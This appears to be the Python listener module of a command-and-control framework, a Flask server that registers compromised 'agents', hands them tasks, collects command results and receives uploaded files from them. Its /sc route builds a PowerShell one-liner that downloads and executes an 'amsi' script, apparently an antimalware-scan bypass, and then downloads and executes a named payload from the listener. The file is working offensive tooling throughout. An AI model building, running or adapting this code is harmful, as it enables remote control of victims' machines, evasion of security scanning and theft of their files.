from agent import Agent
from agentshelpers import clearAgentTasks, displayResults
from common import *
from encryption import generateKey
from werkzeug.utils import secure_filename

import threading
import logging
import flask
import sys
import os
import pickle

from collections import OrderedDict
from multiprocessing import Process
from random import choice
from string import ascii_uppercase

class Listener:    

    def __init__(self, name, port, ipaddress):
        
        self.name       = name
        self.port       = port
        self.ipaddress  = ipaddress
        self.Path       = "data/listeners/{}/".format(self.name)
        self.keyPath    = "{}key".format(self.Path)
        self.filePath   = "{}files/".format(self.Path)
        self.agentsPath = "{}agents/".format(self.Path)
        self.downPath   = "{}/downloads/".format(self.Path)
        self.isRunning  = False
        self.app        = flask.Flask(__name__)

        if os.path.exists(self.Path) == False:
            os.mkdir(self.Path)

        if os.path.exists(self.agentsPath) == False:
            os.mkdir(self.agentsPath)

        if os.path.exists(self.filePath) == False:
            os.mkdir(self.filePath)

        if os.path.exists(self.downPath) == False:
            os.mkdir(self.downPath)

        if os.path.exists(self.keyPath) == False:
            
            key      = generateKey()
            self.key = key

            with open(self.keyPath, "wt") as f:
                f.write(key)
        else:
            with open(self.keyPath, "rt") as f:
                self.key = f.read()

        @self.app.route("/reg", methods=['POST'])
        def registerAgent():
            name     = ''.join(choice(ascii_uppercase) for i in range(6))
            remoteip = flask.request.remote_addr
            hostname = flask.request.form.get("name")
            Type     = flask.request.form.get("type")
            success("Agent {} checked in.".format(name))
            writeToDatabase(agentsDB, Agent(name, self.name, remoteip, hostname, Type, self.key))
            return (name, 200)
        
        @self.app.route("/tasks/<name>", methods=['GET'])
        def serveTasks(name):
            if os.path.exists("{}/{}/tasks".format(self.agentsPath, name)):
                
                with open("{}{}/tasks".format(self.agentsPath, name), "r") as f:
                    task = f.read()
                
                clearAgentTasks(name)
                return(task,200)
            else:
                return ('',204)

        @self.app.route("/results/<name>", methods=['POST'])
        def receiveResults(name):
            result = flask.request.form.get("result")
            displayResults(name, result)
            return ('',204)

        @self.app.route("/download/<name>", methods=['GET'])
        def sendFile(name):
            f    = open("{}{}".format(self.filePath, name), "rt")
            data = f.read()
            
            f.close()
            return (data, 200)

        @self.app.route("/sc/<name>", methods=['GET'])
        def sendScript(name):
            amsi     = "IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/download/amsi\')".format(self.ipaddress,str(self.port))
            oneliner = "{};Start-Sleep 2;IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/download/{}\')".format(amsi,self.ipaddress,str(self.port),name)
        
            return (oneliner, 200)

        @self.app.route("/receiver/<name>", methods=['POST'])
        def receiveFile(name):
            print(f'\nReceiving File:')
            # check if the post request has the file part
            if 'file' not in flask.request.files:
                print('No file part')
                return ('', 204)
            file = flask.request.files['file']
            # If the user does not select a file, the browser submits an empty file without a filename.
            if file.filename == '':
                print('No selected file')
                return ('', 204)
            if file:
                filename = secure_filename(file.filename)
                success("{} saved in: {}".format(filename, self.downPath))
                file.save(os.path.join(self.downPath, filename))
                return (f'Uploaded file: {file.filename}', 201)

    def run(self):
        self.app.logger.disabled = False
        self.app.run(port=self.port, host=self.ipaddress)

    def setFlag(self):
        self.flag = 1

    def start(self):

        self.server = Process(target=self.run)

        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None

        self.daemon = threading.Thread(name = self.name,
                                       target = self.server.start,
                                       args = ())
        self.daemon.daemon = True
        self.daemon.start()

        self.isRunning = True

    def stop(self):

        self.server.terminate()
        self.server    = None
        self.daemon    = None
        self.isRunning = False